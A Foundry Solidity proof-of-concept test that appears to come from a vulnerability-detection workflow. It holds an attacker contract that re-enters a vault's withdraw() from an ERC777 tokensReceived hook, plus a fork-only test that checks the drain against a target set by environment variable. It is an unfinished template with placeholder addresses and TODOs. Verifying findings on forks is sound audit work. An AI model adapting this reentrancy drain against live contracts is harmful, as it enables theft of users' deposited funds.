// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- ERC777 tokensReceived hook reentrancy
/// @notice Detector: reentrancy. ERC777 tokens call tokensReceived() on the
///         recipient BEFORE the sender's state settles. A vault that sends
///         ERC777 tokens back and only then updates the user's balance lets
///         the attacker re-enter withdraw() from the hook.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt IVault to the target's real
///      deposit/withdraw signatures and the ERC777 token address.

interface IERC777 {
    function balanceOf(address who) external view returns (uint256);
    function send(address to, uint256 amount, bytes calldata data) external;
}

interface IVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract ERC777Attacker {
    IVault public immutable vault;
    IERC777 public immutable token;
    uint256 public reentries;
    uint256 public maxReentries;
    uint256 public amount;

    constructor(address vault_, address token_) {
        vault = IVault(vault_);
        token = IERC777(token_);
    }

    function attack(uint256 amount_, uint256 maxReentries_) external {
        amount = amount_;
        maxReentries = maxReentries_;
        vault.deposit(amount);
        vault.withdraw(amount);
    }

    // ERC777 calls this on the recipient during token.send().
    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (reentries < maxReentries) {
            reentries++;
            vault.withdraw(amount);
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the ERC777 token the vault holds.
    address public constant TOKEN = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(TOKEN != address(0), "set TOKEN to the ERC777 token address");

        address attackerEOA = makeAddr("attacker");
        ERC777Attacker attacker = new ERC777Attacker(target, TOKEN);

        // Fund the attacker contract with tokens (prank a holder / whale).
        // TODO: replace with a real holder on this fork.
        address whale = makeAddr("whale");
        vm.prank(whale);
        IERC777(TOKEN).send(address(attacker), 1000, bytes("")); 

        uint256 before = IERC777(TOKEN).balanceOf(address(attacker));
        vm.prank(attackerEOA);
        attacker.attack(100, 3);
        uint256 after_ = IERC777(TOKEN).balanceOf(address(attacker));

        console.log("token balance before:", before);
        console.log("token balance after:", after_);
        console.log("reentries:", attacker.reentries());
        assertGt(after_, before, "exploit did not reproduce: no extra tokens via hook reentrancy");

    }
}
